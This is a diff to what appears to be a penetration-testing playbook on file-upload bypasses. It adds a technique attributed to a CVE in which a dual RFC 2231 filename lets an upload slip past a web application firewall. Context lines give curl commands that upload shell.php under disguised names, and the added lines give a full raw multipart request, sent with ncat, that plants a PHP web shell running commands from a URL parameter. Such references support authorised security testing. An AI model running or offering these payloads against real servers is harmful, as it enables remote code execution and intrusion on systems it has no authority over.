@@ -46,6 +46,10 @@ chains_with: [broken-access-control, crlf-injection]
    curl -s -i -F "file=@shell.php;filename=shell.phtml" https://target.com/upload
    curl -s -i -F "file=@shell.php;filename=shell.php%00.jpg" https://target.com/upload
    curl -s -i -F "file=@shell.php;filename=.htaccess" https://target.com/upload   # re-register handlers if Apache allows .htaccess in upload dir
+   # RFC 2231 dual filename (CVE-2026-104269, ModSecurity 3.x and others): the WAF
+   # reads filename= (safe.jpg) while Go/Werkzeug/Starlette/Spring/busboy prefer
+   # filename* — so the backend writes shell.php that the WAF never inspected.
+   printf 'POST /upload HTTP/1.1\r\nHost: target.com\r\nContent-Type: multipart/form-data; boundary=X\r\n\r\n--X\r\nContent-Disposition: form-data; name="file"; filename="safe.jpg"; filename*=UTF-8'"'"''"'"'shell.php\r\nContent-Type: application/x-php\r\n\r\n<?php system($_GET[0]); ?>\r\n--X--\r\n' | ncat --ssl target.com 443   # PHP native is NOT vulnerable to this specific vector
    ```
 
 3. **Content-Type / MIME bypass.** Server may trust the client-supplied `Content-Type` field instead of sniffing content:
